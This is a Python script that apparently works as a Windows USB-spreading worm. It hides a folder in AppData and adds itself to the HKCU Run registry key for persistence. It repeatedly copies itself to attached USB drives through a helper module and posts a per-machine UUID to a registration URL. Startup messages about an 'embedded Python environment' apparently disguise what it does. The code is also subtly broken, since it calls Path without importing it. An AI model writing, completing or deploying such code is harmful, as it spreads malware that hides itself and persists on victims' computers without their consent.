import sys
import pathlib
import uuid
import requests
import psutil
import winreg
import shutil
from time import sleep
import subprocess
import os
import threading
import wideme

exceptlist = []
fichiers = [f for f in pathlib.Path.cwd().glob("_*") if f.is_file()]
            
if fichiers:
    n_feti_c = fichiers[0].name
else:
    n_feti_c = f"_{uuid.uuid4().hex}.txt"
    open(n_feti_c, "x").close()
            
na_wiout_extt = n_feti_c.partition(":")[0]
url = f"http://localhost:8000/regis/{na_wiout_extt}"

def ushiLaleNaReg(usrDirInDocs):
    RegExcept = ""
    usrDirInDocs.parent.mkdir(parents=True, exist_ok=True)
    if not os.path.exists(rf"{usrDirInDocs}/winXs.txt"):
        open(rf"{usrDirInDocs}/winXs.txt", "w").close()
        os.system(f"attrib +h {usrDirInDocs}")
            
#.....................................................................................................................................
        nfungulo = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, nfungulo, 0, winreg.KEY_SET_VALUE) as nfunguloYaKuReg:
                winreg.SetValueEx(nfunguloYaKuReg, "key_runwin", 0, winreg.REG_SZ, __file__)
        except Exception as R:
            exceptlist.append(f"Reg.STAT_{str(R)}")

#........................................................................................................            

def uEzbVatchir():
    
    while True:
        usbList = wideme.FindEm()
        for usb in usbList:
            sleep(13)
            sanities = wideme.Duplicata(__file__, usb)
            exceptlist.append(sanities)
        sleep(3)
        

def main():
    print("Python embarqué :", sys.version)
    print("Exécutable      :", sys.executable)
    print("Requests        :", requests.__version__)
    print("Environnement Python autonome opérationnel.")
       
    gorcprfil = Path(f"~/AppData").expanduser()
    if not os.path.exists(rf"{gorcprfil}/winXs.txt"):
        ushiLaleNaReg(gorcprfil)
        
    response = requests.post(
                url,
                data=exceptlist,
                headers={
                    "Content-Type": "text/plain; charset=utf-8"
                }
            )

if __name__ == "__main__":
    main()

tgoseeswelseThread = threading.Thread(target=uEzbVatchir, daemon=False)
tgoseeswelseThread.start()